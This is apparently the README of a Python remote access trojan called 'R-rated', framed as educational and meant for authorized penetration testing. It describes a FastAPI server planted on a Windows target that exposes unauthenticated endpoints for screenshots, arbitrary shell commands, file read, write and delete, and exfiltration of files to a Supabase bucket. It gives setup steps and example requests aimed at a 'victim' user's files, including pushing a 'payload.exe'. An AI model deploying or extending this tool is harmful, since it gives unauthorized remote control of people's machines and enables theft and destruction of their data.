# R-rated

 Educational RAT for authorized penetration testing. Client-server remote administration with Supabase-backed file exfiltration.

## Architecture

Browser Client ──HTTP──▶ FastAPI Server (port 6969, Windows target)  
│  
├── pyautogui (screenshots)  
├── subprocess (cmd execution)    
└── Supabase (file storage)




The server runs on the target Windows machine. The client is a static HTML page. File exfiltration/injection routes through Supabase storage.

## Features

| Endpoint | What it does |
|---|---|
| `GET /screenshot` | Screen capture via pyautogui |
| `GET /getdir` | List directory contents (relative to `C:\`) |
| `GET /readfile` | Read text file |
| `GET /createfile` | Create/overwrite file |
| `GET /removefile` | Delete file |
| `GET /removefolder` | Recursively delete folder |
| `GET /downloadfile` | Upload target file → Supabase, return public URL |
| `GET /uploadfile` | Download from Supabase → write to target |
| `GET /cmd` | Execute shell command |

## Quick Start

### 1. Server dependencies

```bash
pip install fastapi uvicorn pyautogui python-dotenv supabase
2. Supabase setup
Create a Supabase project
Create a public storage bucket named rat
Create a folder inside it called public
```
### 3. Environment (.env)



```bash
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_KEY=your-service-role-key
```

### 4. Start the server (on Windows target)
```bash
python server.py
# or:
uvicorn server:app --host 0.0.0.0 --port 6969
5. Open the client
Open client.html in a browser. If the server is remote, update the BASE constant:
```

```js
const BASE = "http://<target-ip>:6969";
```
## API Quick Reference
All endpoints accept GET requests. Paths are relative to C:\.

| Endpoint | 	Example
-----------|------------
| /screenshot | 	GET /screenshot
| /getdir?path=Users\victim\Desktop	| 
| /readfile?path=Users\victim\notes.txt	| 
| /createfile?path=test.txt&content=hello	| 
| /removefile?path=bad.txt	| 
| /removefolder?path=secret	| 
| /downloadfile?path=secret.docx |  	returns Supabase URL
| /uploadfile?dwpath=Desktop\&dbfilename=payload.exe	| 
| /cmd?cmd=whoami&path=Users\victim	| returns {stdout, stderr, code}
-----
# Security Notes
1. No auth — open to anyone who can reach the target. Tunnel over SSH/VPN in real engagements.
2. Plaintext HTTP — everything is visible on the wire.
3. Path traversal not prevented — ../ works. Intended for red-team flexibility.
4. Memory-bound exfil — reads entire file into RAM before uploading. Not suited for large files.
5. AV detection — pyautogui and subprocess are commonly monitored
